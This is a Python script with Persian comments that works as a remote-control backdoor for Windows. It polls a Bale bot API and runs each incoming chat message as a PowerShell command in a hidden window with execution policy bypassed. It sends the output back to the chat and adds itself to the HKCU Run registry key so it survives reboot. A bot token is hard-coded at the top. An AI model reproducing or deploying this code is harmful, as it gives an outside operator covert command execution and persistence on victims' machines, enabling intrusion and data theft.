#388397570:EDWVl7BWb5tO5KkeuYLN2yvMDhJ7dY3xS6c1hdWD


import requests
import subprocess
import winreg
import uuid
import os

TOKEN = '388397570:EDWVl7BWb5tO5KkeuYLN2yvMDhJ7dY3xS6c1hdWD'
API_URL = f'https://tapi.bale.ai/bot{TOKEN}/'
is_system_command = False
current_chat_id = None
current_directory = os.getcwd()  # مقداردهی اولیه به current_directory با دایرکتوری فعلی

def send_message(chat_id, text, reply_markup=None):
    url = API_URL + 'sendMessage'
    payload = {'chat_id': chat_id, 'text': text, 'reply_markup': reply_markup}
    requests.post(url, json=payload)

def run_powershell_command_hidden(command):
    global current_directory  # اعلام اینکه از متغیر سراسری استفاده می‌شود
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        # بررسی اگر دستور cd است
        if command.startswith('cd '):
            path = command[3:].strip()
            if path == '':
                current_directory = os.path.expanduser('~')
                return f"Directory changed to: {current_directory}"
            else:
                new_directory = os.path.abspath(os.path.join(current_directory, path))
                if os.path.isdir(new_directory):
                    current_directory = new_directory
                    return f"Directory changed to: {current_directory}"
                else:
                    return "Error: Directory not found"
        else:
            # ترکیب دستورات برای اجرای در یک جلسه
            combined_command = f"Set-Location -Path '{current_directory}'; {command}"

        result = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', combined_command],
                                capture_output=True, text=True, check=True, startupinfo=startupinfo)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return f"Error: {e}"
    except Exception as e:
        print(f"Unexpected error: {e}")
        return f"Unexpected error: {e}"

def generate_random_registry_key_name():
    return str(uuid.uuid4())[:8]

def add_to_registry_on_startup(program_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        registry_key_name = 'MyAppStartupKey'
        winreg.SetValueEx(registry_key, registry_key_name, 0, winreg.REG_SZ, program_path)
        winreg.CloseKey(registry_key)
        print(f"برنامه با موفقیت به رجیستری با نام '{registry_key_name}' اضافه شد.")
        return registry_key_name
    except Exception as e:
        print(f"خطا در اضافه کردن به رجیستری: {str(e)}")
        return None

def check_and_add_to_startup():
    program_path = os.path.abspath(__file__)
    key_name = 'MyAppStartupKey'
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_READ) as registry_key:
            value, regtype = winreg.QueryValueEx(registry_key, key_name)
            if value == program_path:
                return  # برنامه قبلاً اضافه شده است
    except FileNotFoundError:
        pass  # کلید وجود ندارد، بنابراین باید اضافه کنیم

    add_to_registry_on_startup(program_path)

def handle_update(update):
    global is_system_command, current_chat_id

    message = update.get('message')
    if message:
        current_chat_id = message['chat']['id']
        text = message.get('text')

        if text == '/start':
            send_message(current_chat_id, "سلام رفیق! به ربات کنترل PowerShell خوش اومدی.")
            markup = {
                'keyboard': [[{'text': 'اجرای دستورات پاورشلی'}]],
                'resize_keyboard': True,
                'one_time_keyboard': True
            }
            send_message(current_chat_id, "برای شروع ربات دکمه زیر رو انتخاب کن👇", reply_markup=markup)

        elif text == 'اجرای دستورات پاورشلی':
            send_message(current_chat_id, "لطفاً دستور خود را برای اجرا وارد کنید.")
            is_system_command = True

        elif text == 'پایان عملیات':
            send_message(current_chat_id, "عملیات به پایان رسید.")
            is_system_command = False
            markup = {
                'keyboard': [[{'text': 'اجرای دستورات پاورشلی'}]],
                'resize_keyboard': True,
                'one_time_keyboard': True
            }
            send_message(current_chat_id, "عملیات به پایان رسید. برای شروع دوباره دستورات پاورشلی، دکمه 'اجرای دستورات پاورشلی' را بزنید.", reply_markup=markup)
        
        else:
            if is_system_command:
                powershell_command = text
                output = run_powershell_command_hidden(powershell_command)
                if output:
                    send_message(current_chat_id, "نتیجه اجرای دستور:\n" + output)
                else:
                    send_message(current_chat_id, "اجرای دستور PowerShell با شکست مواجه شد.")
                markup = {
                    'keyboard': [[{'text': 'پایان عملیات'}]],
                    'resize_keyboard': True,
                    'one_time_keyboard': True
                }
                send_message(current_chat_id, "برای پایان دادن به عملیات، دکمه 'پایان عملیات' را بزنید.", reply_markup=markup)

def get_updates(offset=None):
    url = API_URL + 'getUpdates'
    params = {'timeout': 100, 'offset': offset}
    response = requests.get(url, params=params)
    return response.json()

def main():
    check_and_add_to_startup()  # اضافه کردن به startup اگر لازم است
    last_update_id = None
    while True:
        updates = get_updates(last_update_id)
        for update in updates['result']:
            handle_update(update)
            last_update_id = update['update_id'] + 1

if __name__ == '__main__':
    main()
